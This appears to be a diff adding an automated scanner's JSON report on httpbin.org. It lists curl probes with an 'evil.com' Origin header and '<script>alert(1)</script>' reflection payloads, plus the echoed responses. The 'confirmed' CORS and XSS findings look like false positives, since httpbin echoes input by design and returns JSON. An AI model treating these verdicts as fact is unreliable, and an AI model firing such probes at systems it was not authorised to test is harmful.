@@ -1,0 +1,108 @@
+{
+  "target": "https://httpbin.org",
+  "scan_time": "00:10:59",
+  "recon_summary": {
+    "subdomains": 0,
+    "ports": 0,
+    "endpoints": 1,
+    "directories": 12,
+    "waf": "none"
+  },
+  "analysis_summary": {
+    "potential_vulns": 0,
+    "priority_targets": 0
+  },
+  "plan_summary": {
+    "total_tasks": 12
+  },
+  "execution_summary": {
+    "tasks_executed": 12,
+    "confirmed": 3,
+    "potential": 1
+  },
+  "confirmed_vulnerabilities": [
+    {
+      "task_id": "QW-001",
+      "attack_type": "CORS Misconfiguration",
+      "target_url": "https://httpbin.org",
+      "tool_used": "curl",
+      "status": "vulnerable",
+      "severity": "high",
+      "evidence": "access-control-allow-origin: https://evil.com",
+      "poc": {
+        "description": "Send a request with an arbitrary Origin header to the target endpoint",
+        "request": "curl -s -I -H 'Origin: https://evil.com' 'https://httpbin.org'",
+        "response_indicator": "access-control-allow-origin: https://evil.com in the response"
+      },
+      "attempts": [
+        {
+          "command": "curl -s -I -H 'Origin: https://evil.com' 'https://httpbin.org' | grep -i 'access-control'",
+          "output": "access-control-allow-origin: https://evil.com\r\naccess-control-allow-credentials: true\r\n",
+          "error": "",
+          "success": true,
+          "time": 1.1095733642578125
+        }
+      ]
+    },
+    {
+      "task_id": "ATK-003",
+      "attack_type": "Cross-Site Scripting (XSS)",
+      "target_url": "https://httpbin.org/get",
+      "tool_used": "curl",
+      "status": "vulnerable",
+      "severity": "low",
+      "evidence": "Payload reflected unencoded in response",
+      "poc": {
+        "payload": "<script>alert(1)</script>",
+        "command": "curl -s -i 'https://httpbin.org/get?url=%3Cscript%3Ealert%281%29%3C%2Fscript%3E'",
+        "response_snippet": "HTTP/2 200 \r\ndate: Fri, 20 Mar 2026 15:21:48 GMT\r\ncontent-type: application/json\r\ncontent-length: 331\r\nserver: gunicorn/19.9.0\r\naccess-control-allow-origin: *\r\naccess-control-allow-credentials: true\r\n\r\n{\n  \"args\": {\n    \"url\": \"<script>alert(1)</script>\"\n  }, \n  \"headers\": {\n    \"Accept\": \"*/*\", \n    \"Host\": \"httpbin.org\", \n    \"User-Agent\": \"curl/8.18.0\", \n    \"X-Amzn-Trace-Id\": \"Root=1-69bd660c-6060d0625e3dca5005cae667\"\n  }, \n  \"origin\": \"103.212.146.133\", \n  \"url\": \"https://httpbin.org/get?ur"
+      },
+      "attempts": [
+        {
+          "command": "curl -X GET 'https://httpbin.org/get?url=<script>alert(1)</script>'",
+          "output": "{\n  \"args\": {\n    \"url\": \"<script>alert(1)</script>\"\n  }, \n  \"headers\": {\n    \"Accept\": \"*/*\", \n    \"Host\": \"httpbin.org\", \n    \"User-Agent\": \"curl/8.18.0\", \n    \"X-Amzn-Trace-Id\": \"Root=1-69bd6609-68d36d95270abe76401f4e48\"\n  }, \n  \"origin\": \"103.212.146.133\", \n  \"url\": \"https://httpbin.org/get?url=<script>alert(1)<%2Fscript>\"\n}\n",
+          "error": "  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current\n                                 Dload  Upload  Total   Spent   Left   Speed\n\r  0      0   0      0   0      0      0      0                              0\r  0      0   0      0   0      0      0      0           00:01              0\r100    331 100    331   0      0    305      0   00:01   00:01            305\r100    331 100    331   0      0    305      0   00:01   00:01            305\r100    331 100    331   0      ",
+          "success": true,
+          "time": 1.1088228225708008
+        },
+        {
+          "payload": "<script>alert(1)</script>",
+          "vulnerable": true,
+          "evidence": "Payload reflected unencoded in response",
+          "command": "curl -s -i 'https://httpbin.org/get?url=%3Cscript%3Ealert%281%29%3C%2Fscript%3E'",
+          "response": "HTTP/2 200 \r\ndate: Fri, 20 Mar 2026 15:21:48 GMT\r\ncontent-type: application/json\r\ncontent-length: 331\r\nserver: gunicorn/19.9.0\r\naccess-control-allow-origin: *\r\naccess-control-allow-credentials: true\r\n\r\n{\n  \"args\": {\n    \"url\": \"<script>alert(1)</script>\"\n  }, \n  \"headers\": {\n    \"Accept\": \"*/*\", \n    \"Host\": \"httpbin.org\", \n    \"User-Agent\": \"curl/8.18.0\", \n    \"X-Amzn-Trace-Id\": \"Root=1-69bd660c-6060d0625e3dca5005cae667\"\n  }, \n  \"origin\": \"103.212.146.133\", \n  \"url\": \"https://httpbin.org/get?url=<script>alert(1)<%2Fscript>\"\n}\n"
+        }
+      ]
+    },
+    {
+      "task_id": "ATK-004",
+      "attack_type": "Cross-Site Scripting (XSS)",
+      "target_url": "https://httpbin.org/post",
+      "tool_used": "curl",
+      "status": "vulnerable",
+      "severity": "low",
+      "evidence": "Payload reflected unencoded in response",
+      "poc": {
+        "payload": "<script>alert(1)</script>",
+        "command": "curl -s -i -X POST -d 'url=<script>alert(1)</script>' 'https://httpbin.org/post'",
+        "response_snippet": "HTTP/2 200 \r\ndate: Fri, 20 Mar 2026 15:21:51 GMT\r\ncontent-type: application/json\r\ncontent-length: 450\r\nserver: gunicorn/19.9.0\r\naccess-control-allow-origin: *\r\naccess-control-allow-credentials: true\r\n\r\n{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"url\": \"<script>alert(1)</script>\"\n  }, \n  \"headers\": {\n    \"Accept\": \"*/*\", \n    \"Content-Length\": \"29\", \n    \"Content-Type\": \"application/x-www-form-urlencoded\", \n    \"Host\": \"httpbin.org\", \n    \"User-Agent\": \"curl/8.18.0\", \n    \"X-"
+      },
+      "attempts": [
+        {
+          "command": "curl -X POST -d 'url=<script>alert(1)</script>' https://httpbin.org/post",
+          "output": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"url\": \"<script>alert(1)</script>\"\n  }, \n  \"headers\": {\n    \"Accept\": \"*/*\", \n    \"Content-Length\": \"29\", \n    \"Content-Type\": \"application/x-www-form-urlencoded\", \n    \"Host\": \"httpbin.org\", \n    \"User-Agent\": \"curl/8.18.0\", \n    \"X-Amzn-Trace-Id\": \"Root=1-69bd660d-3bc7ba046c393c950e598d57\"\n  }, \n  \"json\": null, \n  \"origin\": \"103.212.146.133\", \n  \"url\": \"https://httpbin.org/post\"\n}\n",
+          "error": "  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current\n                                 Dload  Upload  Total   Spent   Left   Speed\n\r  0      0   0      0   0      0      0      0                              0\r100     29   0      0 100     29      0     26   00:01   00:01             26\r100    479 100    450 100     29    333     21   00:01   00:01             26\r100    479 100    450 100     29    333     21   00:01   00:01             26\r100    479 100    450 100     2",
+          "success": true,
+          "time": 1.3768842220306396
+        },
+        {
+          "payload": "<script>alert(1)</script>",
+          "vulnerable": true,
+          "evidence": "Payload reflected unencoded in response",
+          "command": "curl -s -i -X POST -d 'url=<script>alert(1)</script>' 'https://httpbin.org/post'",
+          "response": "HTTP/2 200 \r\ndate: Fri, 20 Mar 2026 15:21:51 GMT\r\ncontent-type: application/json\r\ncontent-length: 450\r\nserver: gunicorn/19.9.0\r\naccess-control-allow-origin: *\r\naccess-control-allow-credentials: true\r\n\r\n{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"url\": \"<script>alert(1)</script>\"\n  }, \n  \"headers\": {\n    \"Accept\": \"*/*\", \n    \"Content-Length\": \"29\", \n    \"Content-Type\": \"application/x-www-form-urlencoded\", \n    \"Host\": \"httpbin.org\", \n    \"User-Agent\": \"curl/8.18.0\", \n    \"X-Amzn-Trace-Id\": \"Root=1-69bd660f-12bb564a372990814a9f2a32\"\n  }, \n  \"json\": null, \n  \"origin\": \"103.212.146.133\", \n  \"url\": \"https://httpbin.org/post\"\n}\n"
+        }
+      ]
+    }
+  ]
+}
